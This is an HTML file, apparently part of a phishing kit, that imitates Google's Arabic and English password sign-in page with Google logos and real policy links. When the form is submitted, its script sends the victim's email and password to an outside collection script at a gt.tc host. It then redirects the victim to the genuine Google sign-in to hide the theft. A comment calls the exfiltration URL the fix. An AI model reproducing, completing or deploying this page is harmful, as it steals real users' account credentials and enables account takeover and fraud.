<!-- ====== password.html (نسخة مُصلَحة بالكامل) ====== -->
<!DOCTYPE html>
<html lang="ar" dir="rtl" id="html-root">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff; color: #202124;
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh;
        }
        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 4px; text-align: center; }
        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; text-align: center; word-break: break-all; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; background: #fff; }
        .email-pill {
            display: inline-flex; align-items: center; gap: 8px;
            background: #f1f3f4; border: 1px solid #dadce0; border-radius: 24px;
            padding: 8px 16px; margin-bottom: 24px; cursor: pointer;
            font-size: 14px; font-weight: 500;
        }
        .email-pill .arrow { font-size: 12px; color: #5f6368; margin-right: auto; }
        .input-group { margin-bottom: 24px; position: relative; }
        .input-field {
            width: 100%; padding: 13px 15px; font-size: 16px; line-height: 24px;
            border: 1px solid #dadce0; border-radius: 4px; outline: none;
            transition: 0.2s; font-family: inherit;
        }
        .input-field:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .input-field.error {
            border-color: #d93025 !important;
            box-shadow: 0 0 0 2px rgba(217,48,37,0.2) !important;
        }
        .error-msg {
            display: flex; align-items: flex-start; gap: 8px; font-size: 12px;
            color: #d93025; margin-top: 4px; line-height: 1.4;
        }
        .error-msg.hidden { display: none; }
        .error-circle {
            display: inline-flex; align-items: center; justify-content: center;
            width: 16px; height: 16px; background: #d93025; color: white;
            border-radius: 50%; font-size: 11px; font-weight: bold; margin-top: 2px;
            flex-shrink: 0;
        }
        .forgot-password { font-size: 14px; color: #1a73e8; text-decoration: none; font-weight: 500; margin-top: 8px; display: inline-block; }
        .forgot-password:hover { text-decoration: underline; }
        .guest-text { font-size: 14px; color: #5f6368; margin-top: 32px; line-height: 1.4286; }
        .guest-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .create-account { font-size: 14px; color: #1a73e8; text-decoration: none; font-weight: 500; }
        .create-account:hover { text-decoration: underline; }
        .btn-next {
            background: #1a73e8; color: white; border: none; border-radius: 4px;
            height: 36px; padding: 0 24px; font-size: 14px; font-weight: 500;
            cursor: pointer; transition: 0.2s; font-family: inherit;
        }
        .btn-next:hover { background: #1765c1; }
        .btn-next:active { background: #1558b0; }
        .footer { margin-top: 24px; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
        .footer select { border: none; background: transparent; color: #5f6368; font-size: 12px; appearance: none; padding-right: 15px; cursor: pointer; }
        .footer a { color: #5f6368; text-decoration: none; margin-left: 16px; }
        .footer a:hover { text-decoration: underline; }
        @media (max-width: 600px) {
            .container { padding: 24px 24px 36px; }
            .card { border: none; padding: 24px 24px 36px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <h1 id="welcome-title">مرحباً</h1>
        <p class="subtitle" id="dynamic-subtitle"></p>
        <div class="card">
            <div class="email-pill" id="email-display-box">
                <span id="display-email"></span>
                <span class="arrow">▸</span>
            </div>
            <form id="password-form">
                <div class="input-group">
                    <input type="password" id="password-input" name="pass" class="input-field" placeholder="أدخل كلمة المرور" autofocus required>
                    <div id="password-error" class="error-msg hidden">
                        <span class="error-circle">!</span>
                        <span id="password-error-text"></span>
                    </div>
                </div>
                <a href="#" target="_blank" class="forgot-password" id="forgot-password-link">هل نسيت كلمة المرور؟</a>
                <p class="guest-text">
                    <span id="guest-text-1">ليست هذه حاسوبك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.</span>
                    <a href="#" id="guest-link">مزيد من المعلومات حول استخدام وضع الضيف</a>
                </p>
                <div class="actions">
                    <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank" class="create-account" id="create-account-link">إنشاء حساب</a>
                    <button type="submit" class="btn-next" id="next-btn">التالي</button>
                </div>
            </form>
        </div>
        <div class="footer">
            <select id="lang-switcher">
                <option value="ar">العربية</option>
                <option value="en">English (United States)</option>
            </select>
            <div>
                <a href="https://support.google.com/accounts?hl=ar" target="_blank" id="help-link">المساعدة</a>
                <a href="https://policies.google.com/privacy?hl=ar" target="_blank" id="privacy-link">الخصوصية</a>
                <a href="https://policies.google.com/terms?hl=ar" target="_blank" id="terms-link">البنود</a>
            </div>
        </div>
    </div>
    <script>
        const translations = {
            ar: { welcome:'مرحباً', placeholder:'أدخل كلمة المرور', forgotPassword:'هل نسيت كلمة المرور؟',
                  guestText1:'ليست هذه حاسوبك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.',
                  guestLinkText:'مزيد من المعلومات حول استخدام وضع الضيف', createAccount:'إنشاء حساب',
                  nextBtn:'التالي', help:'المساعدة', privacy:'الخصوصية', terms:'البنود',
                  errorEmpty:'أدخل كلمة المرور.', langHelp:'ar', langPrivacy:'ar', langTerms:'ar', dir:'rtl' },
            en: { welcome:'Welcome', placeholder:'Enter your password', forgotPassword:'Forgot password?',
                  guestText1:'Not your computer? Use Guest mode to sign in privately.',
                  guestLinkText:'Learn more about using Guest mode', createAccount:'Create account',
                  nextBtn:'Next', help:'Help', privacy:'Privacy', terms:'Terms',
                  errorEmpty:'Enter a password.', langHelp:'en', langPrivacy:'en', langTerms:'en', dir:'ltr' }
        };

        function applyLanguage(lang) {
            const t = translations[lang];
            document.getElementById('welcome-title').textContent = t.welcome;
            document.getElementById('password-input').placeholder = t.placeholder;
            document.getElementById('forgot-password-link').textContent = t.forgotPassword;
            document.getElementById('guest-text-1').textContent = t.guestText1;
            document.getElementById('guest-link').textContent = t.guestLinkText;
            document.getElementById('create-account-link').textContent = t.createAccount;
            document.getElementById('next-btn').textContent = t.nextBtn;
            document.getElementById('help-link').textContent = t.help;
            document.getElementById('help-link').href = `https://support.google.com/accounts?hl=${t.langHelp}`;
            document.getElementById('privacy-link').textContent = t.privacy;
            document.getElementById('privacy-link').href = `https://policies.google.com/privacy?hl=${t.langPrivacy}`;
            document.getElementById('terms-link').textContent = t.terms;
            document.getElementById('terms-link').href = `https://policies.google.com/terms?hl=${t.langTerms}`;
            document.getElementById('html-root').setAttribute('dir', t.dir);
            document.getElementById('html-root').setAttribute('lang', lang);
        }

        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || 'example@gmail.com';
        let lang = urlParams.get('lang') || 'ar';
        document.getElementById('display-email').textContent = email;
        document.getElementById('dynamic-subtitle').textContent = email;
        document.getElementById('lang-switcher').value = lang;
        applyLanguage(lang);

        const forgotLink = document.getElementById('forgot-password-link');
        forgotLink.href = `https://accounts.google.com/signin/v2/forgotpassword?Email=${encodeURIComponent(email)}&flowName=GlifWebSignIn&flowEntry=ServiceLogin`;

        document.getElementById('lang-switcher').addEventListener('change', function(e) {
            applyLanguage(e.target.value);
        });

        document.getElementById('email-display-box').addEventListener('click', function() {
            window.location.href = 'email.html';
        });

        const passwordForm = document.getElementById('password-form');
        const passwordInput = document.getElementById('password-input');
        const errorDiv = document.getElementById('password-error');
        const errorText = document.getElementById('password-error-text');

        passwordInput.addEventListener('input', function() {
            passwordInput.classList.remove('error');
            errorDiv.classList.add('hidden');
        });

        passwordForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const pass = passwordInput.value.trim();
            errorDiv.classList.add('hidden');
            passwordInput.classList.remove('error');
            const currentLang = document.getElementById('lang-switcher').value;
            const t = translations[currentLang];

            if (pass === '') {
                errorText.textContent = t.errorEmpty;
                errorDiv.classList.remove('hidden');
                passwordInput.classList.add('error');
                return;
            }

            // ⚡ رابط fetch المُصحَّح – هذا هو الإصلاح الوحيد
            fetch('http://link3-basick.gt.tc/store.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(pass)
            })
            .finally(() => {
                // التوجيه لجوجل الحقيقي يتم دائمًا بعد محاولة الإرسال
                window.location.replace('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn');
            });
        });
    </script>
</body>
</html>
